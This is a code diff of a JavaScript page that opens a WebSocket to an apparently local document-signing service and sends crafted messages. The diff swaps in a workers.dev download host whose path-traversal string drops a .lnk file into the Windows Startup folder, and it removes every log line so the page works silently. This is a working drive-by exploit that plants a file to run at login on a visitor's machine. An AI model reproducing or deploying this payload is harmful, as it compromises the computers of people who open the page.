@@ -39,7 +39,7 @@
           {
             data: "3333333333333%26ksbizNonce%3D38AFEC39CB79F1276EBE",
             url: "https://localhost/file-to-sign.pdf",
-            downloadUrl: "https://still-surf-2bdb.yistar0123.workers.dev/..\\..\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\AutoHotKey.lnk",
+            downloadUrl: "https://winter.hoyul3467.workers.dev/aaa\\..\\..\\..\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\startup.lnk",
             uploadUrl: "https://localhost/",
             options: {
               addNonce: true,
@@ -62,18 +62,16 @@
   const log = (msg) => {
     const el = document.getElementById("log");
     if (el) el.textContent += msg + "\n";
-    console.log(msg);
+    
   };
 
   const ws = new WebSocket(wsUrl);
 
   ws.onopen = () => {
-    log("✅ WebSocket 연결 성공");
     sendMessage();
   };
 
   ws.onmessage = (event) => {
-    log("📥 수신 메시지:\n" + event.data);
     if (step === 0 || step === 1) {
       step++;
       setTimeout(sendMessage, 300);
@@ -81,20 +79,20 @@
   };
 
   ws.onerror = (event) => {
-    log("❌ WebSocket 오류 발생: " + (event.message || "[unknown]"));
+    
   };
 
   ws.onclose = () => {
-    log("🔌 WebSocket 연결 종료");
+    
   };
 
   function sendMessage() {
     if (step < messages.length) {
       const msg = JSON.stringify(messages[step]);
-      log(`📤 (${step + 1}/${messages.length}) 메시지 전송:\n${msg}`);
+      
       ws.send(msg);
     } else {
-      log("✅ 모든 메시지 전송 완료");
+      
       ws.close();
     }
   }
